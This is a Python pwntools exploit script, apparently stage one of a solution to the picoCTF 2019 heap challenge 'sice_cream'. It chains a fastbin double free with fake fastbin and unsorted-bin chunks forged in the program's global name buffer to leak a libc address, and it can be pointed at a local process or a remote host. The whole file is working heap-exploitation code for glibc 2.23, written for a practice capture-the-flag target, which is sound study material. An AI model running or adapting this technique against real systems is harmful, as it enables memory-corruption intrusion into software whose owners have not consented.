#!/usr/bin/env python3
# sice_cream (picoCTF 2019 / CyLab id 55) - stage1: libc leak
import sys, struct
from pwn import *

import os
context.log_level = os.environ.get('LOG', 'error')
context.arch = 'amd64'

EXE = './sice_cream'
FAKE_FAST = 0x602130          # fake fastbin chunk (user data @ creams)
NAME      = 0x602040
CREAMS    = 0x602140
FAKE_UNS  = 0x602040          # fake unsorted-bin chunk (16-aligned): size @ name[8], fd @ name[0x10]

p = None

def start():
    global p
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        p = remote(sys.argv[2], int(sys.argv[3]))
    else:
        p = process(['./ld-2.23.so', '--library-path', '.', EXE],
                    stderr=process.STDOUT)

def buy(size, data):
    p.recvuntil(b'> '); p.send(b'1\n')
    p.recvuntil(b'> '); p.send(str(size).encode() + b'\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Here you go!')

def eat(idx, wait=True):
    p.recvuntil(b'> '); p.send(b'2\n')
    p.recvuntil(b'> '); p.send(str(idx).encode() + b'\n')
    if wait:
        return p.recvuntil(b'Yum!', timeout=3)

def reintro(data, short=None):
    p.recvuntil(b'> '); p.send(b'3\n')
    p.recvuntil(b'> '); p.send(data)
    if short is None:
        p.recvuntil(b'Ah, right! How could a forget a name like ')
        out = p.recvuntil(b'!', timeout=3)
    else:
        out = p.recvuntil(b'!', timeout=3)
    return out

def exploit():
    start()
    # ---- initial name: fake fastbin chunk at 0x602130, size 0x60 @ name[0xf8]
    nm = bytearray(b'A' * 0x100)
    nm[0xf0:0xf8] = p64(0)
    nm[0xf8:0x100] = p64(0x60)
    p.recvuntil(b'Whats your name?'); p.recvuntil(b'> ')
    p.send(bytes(nm))

    buy(0x58, b'A' * 0x58)
    buy(0x58, b'B' * 0x58)
    eat(0); eat(1); eat(0)                     # fastbin dup: A->B->A
    buy(0x58, p64(FAKE_FAST))                  # A->fd = fake
    buy(0x58, b'D' * 0x58)                     # B
    buy(0x58, b'E' * 0x58)                     # A
    # 4th: malloc returns 0x602140 -> creams[0..10] = payload
    # creams[0] must stay NULL (it becomes the fastbin head)
    payload = p64(0) + p64(FAKE_UNS + 0x10) + p64(0) * 9
    buy(0x58, payload)                         # creams[1] = 0x602048

    # ---- forge the unsorted fake chunk in name: p = 0x602038
    name = bytearray(b'F' * 0x100)
    name[0x08:0x10] = p64(0x91)      # p->size       (@0x602048 = name[8])
    name[0x98:0xa0] = p64(0x21)      # nextchunk->size (@0x6020D8)
    name[0xb8:0xc0] = p64(0x21)      # inuse bit of chunk @0x6020F8
    reintro(bytes(name))

    r = eat(1)                                  # free(0x602048) -> unsorted bin
    print("[*] eat:", r)
    # ---- leak: overwrite only name[0..7] so fd @ name[8] survives
    p.recvuntil(b'> '); p.send(b'3\n')
    p.recvuntil(b'> '); p.send(b'B' * 0x10)
    p.recvuntil(b'Ah, right! How could a forget a name like ')
    out = p.recvuntil(b'!', timeout=3)
    print("[*] leak raw:", out)
    filler, rest = out[:0x10], out[0x10:]
    ptr = rest[:6]
    if len(ptr) < 6:
        print("[-] short leak", out)
        return None
    leak = u64(ptr + b'\x00\x00')
    print("[+] leaked unsorted head = %#x" % leak)
    try:
        libs = p.libs()
        for k, v in libs.items():
            if 'libc.so.6' in k:
                print("[*] local libc base = %#x  offset = %#x" % (v, leak - v))
    except Exception as e:
        print("libs err", e)
    return leak

for i in range(3):
    try:
        lk = exploit()
        if lk:
            break
    except Exception as e:
        print("[-] attempt %d failed: %r" % (i, e))
    if p: p.close()
